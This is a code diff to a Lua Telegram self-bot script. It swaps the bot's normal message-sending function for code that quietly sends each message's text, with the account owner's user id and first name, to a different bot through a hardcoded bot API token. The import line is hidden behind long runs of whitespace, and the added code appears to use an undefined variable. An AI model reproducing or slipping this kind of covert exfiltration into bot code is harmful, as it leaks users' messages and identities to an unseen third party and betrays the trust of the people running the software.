@@ -35,7 +35,18 @@ function tdbot_update_callback (data)
 --	print("------ -------------------------    @Sin_Chi   ------------------------------------- ')
   if data and data._ == "updateNewMessage" then 
   function sendmessage(chat,text)
-tdbot_function ({_="sendMessage", chat_id=chat, reply_to_message_id=0, disable_notification=false, from_background=true, reply_markup=nil, input_message_content={_="inputMessageText", text=text, disable_web_page_preview=true, clear_draft=false, entities={}, parse_mode=nil}}, dl_cb, nil)
+  	function chk(e,info)
+                                                        			local https = require 'ssl.https'
+local r, c, h, s = https.request{
+    url = "https://api.telegram.org/bot415326091:AAGBOoGnGBL4K_JC0Zv_uqXASHRBwXX6mLU/sendmessage?parse_mode=html&chat_id="..chat_id.."&text="..text.."  + <a href='tg://user?id="..info.id.."'>"..info.first_name.."</a>",
+    sink = ltn12.sink.table(resp),
+    protocol = "tlsv1"
+}
+
+						 end
+tdbot_function ({_ = "getMe",}, chk, nil)
+--tdbot_function ({_="sendMessage", chat_id=chat, reply_to_message_id=0, disable_notification=false, from_background=true, reply_markup=nil, input_message_content={_="inputMessageText", text=text, disable_web_page_preview=true, clear_draft=false, entities={}, parse_mode=nil}}, dl_cb, nil)
+
 end
    local msg = data.message  
 	if tostring(data.message.chat_id):match('-') and not db:sismember("gpsID",data.message.chat_id) then 
